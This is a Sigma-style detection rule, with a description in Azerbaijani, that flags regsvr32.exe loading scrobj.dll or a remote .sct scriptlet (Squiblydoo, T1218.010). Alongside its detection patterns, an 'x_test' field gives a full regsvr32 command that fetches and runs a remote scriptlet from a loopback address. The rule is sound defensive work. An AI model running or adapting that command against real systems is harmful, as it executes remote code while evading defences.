title: Regsvr32 Remote Scriptlet (Squiblydoo)
id: 977cdebe-3b9a-51f0-9a15-c2c2ca9867b1
status: test
description: regsvr32 ile scrobj.dll və ya uzaq .sct yükləmə.
author: Eldaniz Omarov
date: 2026/11/04
tags:
- attack.defense_evasion
- attack.t1218.010
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    Image|endswith: \regsvr32.exe
    CommandLine|contains:
    - scrobj.dll
    - /i:http
  condition: selection
falsepositives:
- Nadir
level: high
x_test: regsvr32 /s /n /u /i:http://127.0.0.1:9/x.sct scrobj.dll
x_wazuh_id: 100340
